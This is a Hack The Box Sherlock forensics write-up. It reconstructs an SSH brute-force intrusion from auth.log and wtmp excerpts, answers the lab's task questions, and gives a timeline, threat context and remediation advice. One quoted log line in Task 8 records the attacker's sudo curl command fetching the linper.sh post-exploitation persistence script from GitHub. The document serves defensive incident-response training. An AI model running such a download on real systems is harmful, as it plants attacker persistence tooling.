---
tags:
  - writeup/htb
  - ctf
  - forensics
  - linux
  - log-analysis
  - ssh-bruteforce
  - incident-response
  - persistence
---

# Sherlock Scenario

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Task 1 

```shell

Mar  6 06:31:01 ip-172-31-35-28 CRON[2314]: pam_unix(cron:session): session closed for user confluence  
Mar  6 06:31:01 ip-172-31-35-28 CRON[2313]: pam_unix(cron:session): session closed for user confluence  
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380  
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]  
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
```

## Task2 

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

```shell
Failed password for root from 65.2.161.68 port 46890 ssh2  
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2  
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)  
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.

```

## Task3

Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

```shell
utmpdump wtmp      
Sauvegarde utmp de wtmp  
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]  
[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]  
[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]  
[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]  
[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]  
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]  
[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]  
[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]  
[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]  
[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]  
[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]  
[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]  
[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]  
[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]  
[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]  
[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]  
[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]  
[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]  
[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]  
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]  
[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]  
[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]  
[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]  
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]  
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]  
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]  
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]  
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]  
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```

## Task 4 

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

```shell
p-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2  
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)  
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

## Task 5

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

```shell
useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev  
/pts/1
```


## Task 6


What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

https://attack.mitre.org/techniques/T1136/ 

## Task 7

What time did the attacker's first SSH session end according to auth.log?

```shell
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184  
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root  
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.  
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```


## Task 8 

```shell
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubuserc  
ontent.com/montysecurity/linper/main/linper.sh

```


## Attack Summary

The attacker conducted an SSH brute force attack against the server from IP `65.2.161.68`, eventually gaining access as the `root` user.

After successful authentication, the attacker:

- established an interactive session via SSH
- created a new privileged user (`cyberjunkie`) for persistence
- executed commands using `sudo`
- downloaded a post-exploitation script (`linper.sh`)

The attack follows a classic pattern:

> **brute force → initial access → privilege use → persistence → post-exploitation**

---

## Timeline

- **2024-03-06 06:31:31 UTC**  
    Initial brute force attempts detected (`Invalid user admin`)
- **2024-03-06 06:31:40 UTC**  
    Successful authentication:
    - `root` account compromised
- **2024-03-06 06:32:45 UTC**  
    Interactive SSH session established (wtmp evidence)
- **Session 37 opened**
    - Confirmed attacker session
- **Persistence phase**
    - Creation of user:
        - `cyberjunkie`
- **2024-03-06 06:37:24 UTC**  
    First attacker session terminated
- **Post-exploitation activity**
    - Execution via sudo:
        - download of `linper.sh` from GitHub

---

## Threat Context

The attacker behavior is consistent with a **brute-force driven intrusion** targeting exposed SSH services.

Observed techniques:

- SSH brute force (credential guessing)
- Direct root access (high risk misconfiguration)
- Account creation for persistence (`cyberjunkie`)
- Execution of remote scripts (`linper.sh`)

This aligns with:

> **opportunistic attackers scanning for weak SSH configurations**

The use of:

- root login
- weak credential security
- public post-exploitation tools

suggests:

> **low sophistication attacker leveraging common techniques**

However, impact remains critical due to:

- root access
- persistence
- remote command execution

---

## Remediation 

### Immediate containment

- Block attacker IP `65.2.161.68`
- Disable SSH access temporarily (if needed)
- Terminate all active attacker sessions

---

### Eradication

- Remove unauthorized user:
    - `cyberjunkie`
- Remove downloaded scripts:
    - `linper.sh`
- Check for additional persistence (cron, SSH keys, services)

---

### Credential security

- Disable root SSH login
- Reset all credentials (root + users)
- Enforce strong password policy
- Enable key-based authentication only

---

### System recovery

- Audit all commands executed during attacker session
- Verify system integrity (binaries, configs)
- Rebuild system if compromise is uncertain

---

### Monitoring & detection

- Monitor:
    - failed SSH login attempts
    - brute force patterns
- Alert on:
    - new user creation
    - sudo usage anomalies

---

### Long-term prevention

- Disable root login via SSH (`PermitRootLogin no`)
- Implement fail2ban or rate limiting
- Use MFA where possible
- Restrict SSH access (IP allowlist / VPN)
- Centralize logs for detection (SIEM)
